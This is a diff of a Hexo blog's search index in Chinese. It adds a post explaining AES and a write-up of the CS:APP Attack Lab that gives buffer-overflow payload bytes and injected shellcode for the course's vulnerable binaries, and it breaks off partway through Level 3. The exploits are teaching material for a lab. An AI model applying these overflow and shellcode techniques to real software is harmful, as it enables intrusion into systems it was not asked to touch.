@@ -6,6 +6,232 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
+    <title>AES算法</title>
+    <url>/2023/08/18/AES%E7%AE%97%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="算法简介"><a href="#算法简介" class="headerlink" title="算法简介"></a>算法简介</h2><p>AES（Advanced Encryption Standard，高级加密标准），不同于RC4这种流加密算法，AES属于<strong>块加密</strong>算法，其分组长度固定为128位，仅支持128位、192位、256位的密钥长度（密钥长度每增加64位，算法的循环次数增加两轮，10、12、14），分别称为AES-128、AES-192、AES-256。AES是一种<strong>对称加密</strong>算法。</p>
+<span id="more"></span>
+
+<p>下面以明文和密钥都是128位来举例。</p>
+<h2 id="存储形式"><a href="#存储形式" class="headerlink" title="存储形式"></a>存储形式</h2><p>16字节的明文以4*4矩阵的形式存储。按照从上至下从左至右的顺序存储。<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803174932.png"></p>
+<h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>明文经过<strong>初始变化</strong>然后经过<strong>九轮的循环运算</strong>再经过一轮的<strong>最终轮</strong>运算即可得到密文。</p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803175347.png"></p>
+<p>最终轮相较于九轮循环运算少了列混合的过程，其余三个过程相同。</p>
+<h3 id="初始变换（Intial-round）"><a href="#初始变换（Intial-round）" class="headerlink" title="初始变换（Intial round）"></a>初始变换（Intial round）</h3><p>明文和<strong>子密钥</strong>存储在矩阵按字节进行异或，这一过程称为初始变换</p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803175921.png"></p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180107.png"></p>
+<h3 id="九轮循环运算"><a href="#九轮循环运算" class="headerlink" title="九轮循环运算"></a>九轮循环运算</h3><p>分为四个步骤<strong>字节代换</strong>、<strong>行移位</strong>、<strong>列混合</strong>、<strong>轮密钥加</strong></p>
+<h4 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h4><p>简单来讲就是对初始变换后的明文进行查表替换，这个表就是S-box</p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180404.png"></p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180620.png"></p>
+<p>比如初始矩阵为</p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180742.png"></p>
+<p>第一个元素19，对应S表第一行第九列的元素d4，按照此规律进行全部的替换</p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803181034.png"></p>
+<p>S-box不是固定不变的，也就是说S-box部分可以被魔改，但是不能随意更改，要符合S-box的设计规范。</p>
+<h4 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h4><p>矩阵第一行不变，第二行左移一个字节，第三行左移两个字节，第三行左移三个字节</p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803181615.png"></p>
+<h4 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h4><p>将输入矩阵<strong>左乘</strong>一个给定的4*4矩阵，但是这里的矩阵相乘的<strong>加</strong>和<strong>乘</strong>的规则不同于我们在线代课上接触的。</p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803181829.png"></p>
+<h5 id="加和乘规则"><a href="#加和乘规则" class="headerlink" title="加和乘规则"></a>加和乘规则</h5><p>简单来讲把<strong>加</strong>替换为了<strong>异或</strong>操作<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803200828.png"></p>
+<p>对于<strong>乘法</strong>，我们就将其规则记作下面的 ” · “再mod上m(x)吧！！！因为是在有限域2^8中，所以最终的结果不能存在大于等于八的次数<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803235059.png"></p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803205004.png"></p>
+<p>经过列混合得到<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803205352.png"></p>
+<h4 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h4><p>将得到的矩阵与<strong>子密钥矩阵</strong>进行异或 </p>
+<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803182348.png"></p>
+<h3 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h3><p>上述的过程所提及的密钥都是子密钥矩阵，子密钥矩阵是初始密钥矩阵通过密钥扩展得到的，密钥矩阵经密钥扩展得到十个子密钥矩阵，运用到十次加密中（九轮循环+最终轮）<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803184432.png"></p>
+<p>前四列是初始的，后面的都是计算得来的，计算时讨论下标是不是4的倍数。</p>
+<p><strong>T函数</strong> ：字循环、字节代换、轮常量异或</p>
+<p>字循环：将一列的四个字节循环左移一个字节如【b0,b1,b2,b3】–&gt;【b1,b2,b3,b0】</p>
+<p>字节代换：查S盒进行代换</p>
+<p>轮常量异或：给定10列常量。将前两步得到的结果与轮常量Rcon[j]进行异或，j表示轮数。轮常量数组中的每一个元素为一个32位的双字，且低24位恒为0.高八位（1字节）按如下规则定义：Rcon[1]&#x3D;1,Rcon[i]&#x3D;2*Rcon[i-1]<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803200147.png"></p>
+<p>重复扩展过程得到全部的子密钥矩阵<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803200329.png"></p>
+<h2 id="算法特征"><a href="#算法特征" class="headerlink" title="算法特征"></a>算法特征</h2><p>128位（16字节）一组、S-box、列混合、行移位等过程</p>
+<p>可以进行<strong>魔改</strong>的部分：S-box、列混合、轮密钥加、行移位等过程的顺序可以进行调整。</p>
+]]></content>
+      <tags>
+        <tag>密码学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Attack_lab</title>
+    <url>/2023/08/26/Attack-lab/</url>
+    <content><![CDATA[<p>这个实验非常有意思，了解一下缓冲区溢出相关的知识就可以开始了。</p>
+<p>​                                                        !  ^_^ !</p>
+<span id="more"></span>
+
+<p><strong>文件信息：</strong></p>
+<p>argetk中的文件包括:<br>README.txt：描述目录内容的文件<br>ctarget：易受代码注入攻击的可执行程序<br>rtarget：易受面向返回编程攻击的可执行程序<br>cookie.txt：8位十六进制代码，您将在攻击中使用它作为唯一标识符。<br>farm.c：目标“gadget farm”的源代码，您将使用它生成面向返回的编程攻击。<br>hex2raw：生成攻击字符串的实用程序。</p>
+<p><a href="https://blog.csdn.net/weixin_43362650/article/details/121084611">《深入理解计算机系统》实验三Attack Lab下载和官方文档机翻_Addyz的博客-CSDN博客</a></p>
+<p>看官方文档说是要以csapp3.10.3–3.10.4作为参考，这两个小节主要讲了<strong>缓冲区溢出</strong>和保护机制。</p>
+<h3 id="缓冲区溢出："><a href="#缓冲区溢出：" class="headerlink" title="缓冲区溢出："></a>缓冲区溢出：</h3><h3 id="对抗缓冲区溢出攻击："><a href="#对抗缓冲区溢出攻击：" class="headerlink" title="对抗缓冲区溢出攻击："></a>对抗缓冲区溢出攻击：</h3><h4 id="栈随机化："><a href="#栈随机化：" class="headerlink" title="栈随机化："></a>栈随机化：</h4><p>栈的位置每次运行都有变化，因此很多地址不能确定，代码不能实现跳转。实现的方法是在程序开始时，在栈上分配一段0~n字节之间随机大小的空间。</p>
+<h4 id="金丝雀值-canary"><a href="#金丝雀值-canary" class="headerlink" title="金丝雀值(canary):"></a>金丝雀值(canary):</h4><p>在栈的缓冲区开始的位置填充一个值，每次函数调用这个数值要和数据段中的一个不可更改的值进行比较，一旦发生缓冲区溢出，cannary值就会发生变化，从而结束程序。</p>
+<h4 id="限制可执行代码区域："><a href="#限制可执行代码区域：" class="headerlink" title="限制可执行代码区域："></a>限制可执行代码区域：</h4><p>栈空间被设置为不可执行属性，所以不能直接在输入的字符中创建shellcode，要通过rop才能实行攻击。</p>
+<h3 id="实验部分1代码注入攻击："><a href="#实验部分1代码注入攻击：" class="headerlink" title="实验部分1代码注入攻击："></a>实验部分1代码注入攻击：</h3><h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1:"></a>Level1:</h4><p>test 调用完getbuf，使getbuf 返回执行touch1 而不是返回test 。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!:You called touch1()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的汇编内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	call   400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们只要确定存放返回地址的位置，将其覆盖成4017c0即可。可以看到调用getbuf之后，sub    $0x28,%rsp，创建了0x28字节的缓冲区域，返回地址位于栈底，第一个字符距离栈底28个字节，我们只要输入一串长度为32字节的字符，前二十八个任意填充，后四个按照小端序填充touch1的地址c0 17 40 00即可。</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">c0</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824122941.png"></p>
+<p>正确的姿势是将16进制数据写入flag1.txt然后使用题目中给出的16进制转字符串工具&gt;flag01.txt,然后将flag01.txt作为参数传入。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; flag1.txt  &gt; input1.txt</span><br></pre></td></tr></table></figure>
+
+<p>注意这里的&lt; 和 &gt;不是括号，而是指向，将flag1.txt传入hex，其输出结果写入input1.txt</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ctarget -q -i flag01.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-q选项是不连接网络 （不加此选项会报错）</li>
+<li>-i 是 以文件作为输入</li>
+</ul>
+<h4 id="Level2："><a href="#Level2：" class="headerlink" title="Level2："></a>Level2：</h4><p>test调用getbuf，并返回touch2，和level1的不同在于touch2需要参数，函数的第一个参数是存放在rdi寄存器中的。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val==cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!:You called touche2(0x%.8x)&quot;</span>,val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch2(0x%.8x)\n&quot;</span>,val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应的汇编内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt; vlevel=2;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;   if(val==cookie)</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40181d:	e8 6b 04 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi</span><br><span class="line">  40183d:	e8 0d 05 00 00       	call   401d4f &lt;fail&gt;</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先还是在保存返回地址的地方填充touch2的地址，接下来的难点在于如何将cookie填充到rdi中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp    0x202ce2(%rip),%edi    # if(val==cookie)</span><br></pre></td></tr></table></figure>
+
+<p>cookie的值储存在相对rip偏移0x202ce2的位置。<strong>思路：</strong> 仍然填充44个字节，最后四个字节填充我们编写的shellcode的地址，通过执行shellcode，rdi填充了cookie，并将touch2的地址pop进了栈，最后ret回到touch2。ret指令相当于pop ip，我们64位机器使用retq。</p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824222556.png"></p>
+<p>使用gdb进行调试，<code>b getbuf</code> 将断点设在getbuf函数，查看栈的地址，减去0x28之后，栈顶的地址是0x5561dc78。这是我们填充的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov 0x59b997fa,%edi</span><br><span class="line">push touch2_address</span><br><span class="line">retq</span><br><span class="line">xxxxxxxxxxx</span><br><span class="line">xxxxxxxxxxx</span><br><span class="line">return_address</span><br></pre></td></tr></table></figure>
+
+<p>有一点要注意，栈是从高地址向低地址增长，而代码是从低地址往高地址执行所以填充之后栈空间应该是这样<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824231507.png">接下来是得到相应的字节码，首先用gcc进行汇编操作得到.o后缀的目标文件，然后用odjdump进行反汇编即可。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824232603.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi</span><br><span class="line">5:	68 ec 17 40 00       	push   $0x4017ec</span><br><span class="line">c:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824234910.png"></p>
+<p>成功，中间犯了一个小错误，将<code>push $0x4017ec</code>写成了<code>push   0x4017ec</code>,其中前者代表的是立即数，后者则代表的内存地址处的值。</p>
+<h4 id="Level3："><a href="#Level3：" class="headerlink" title="Level3："></a>Level3：</h4><p>还是test调用完getbuf之后不返回test，而是执行touch3，touch3需要接收参数cookie，touch3中还调用了hexmatch函数，要传递两个参数。</p>
+<p><strong>思路：</strong> 不能直接ret到touch3中，应该像上一个挑战一样，先跳转到我们的shellcode，shellcode完成参数的传递以及ret到touch3。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val,<span class="type">char</span> *sval)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="type">char</span>* s=cbuf+random()%<span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s,<span class="string">&quot;%.8x&quot;</span>,val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval,s,<span class="number">9</span>)==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span>* sval)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span>(hexmatch(cookie,sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!:You called touch3(\&quot;%s\&quot;)\n,sval&quot;</span>);</span><br><span class="line">        calidate(<span class="number">3</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch3(\&quot;%s\&quot;)\n,sval&quot;</span>);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>汇编代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  000000000040184c &lt;hexmatch&gt;:</span><br><span class="line">  40184c:	41 54                	push   %r12</span><br><span class="line">  40184e:	55                   	push   %rbp</span><br><span class="line">  40184f:	53                   	push   %rbx</span><br><span class="line">  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp    #-128</span><br><span class="line">  401854:	41 89 fc             	mov    %edi,%r12d</span><br><span class="line">  401857:	48 89 f5             	mov    %rsi,%rbp</span><br><span class="line">  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401861:	00 00 </span><br><span class="line">  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)</span><br><span class="line">  401868:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40186a:	e8 41 f5 ff ff       	call   400db0 &lt;random@plt&gt;</span><br><span class="line">  40186f:	48 89 c1             	mov    %rax,%rcx</span><br><span class="line">  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx</span><br><span class="line">  401879:	0a d7 a3 </span><br><span class="line">  40187c:	48 f7 ea             	imul   %rdx</span><br><span class="line">  40187f:	48 01 ca             	add    %rcx,%rdx</span><br><span class="line">  401882:	48 c1 fa 06          	sar    $0x6,%rdx</span><br><span class="line">  401886:	48 89 c8             	mov    %rcx,%rax</span><br><span class="line">  401889:	48 c1 f8 3f          	sar    $0x3f,%rax</span><br><span class="line">  40188d:	48 29 c2             	sub    %rax,%rdx</span><br><span class="line">  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax</span><br><span class="line">  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax</span><br><span class="line">  401898:	48 c1 e0 02          	shl    $0x2,%rax</span><br><span class="line">  40189c:	48 29 c1             	sub    %rax,%rcx</span><br><span class="line">  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx</span><br><span class="line">  4018a3:	45 89 e0             	mov    %r12d,%r8d</span><br><span class="line">  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx</span><br><span class="line">  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx</span><br><span class="line">  4018b2:	be 01 00 00 00       	mov    $0x1,%esi</span><br><span class="line">  4018b7:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4018bf:	e8 ac f5 ff ff       	call   400e70 &lt;__sprintf_chk@plt&gt;</span><br><span class="line">  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx</span><br><span class="line">  4018c9:	48 89 de             	mov    %rbx,%rsi</span><br><span class="line">  4018cc:	48 89 ef             	mov    %rbp,%rdi</span><br><span class="line">  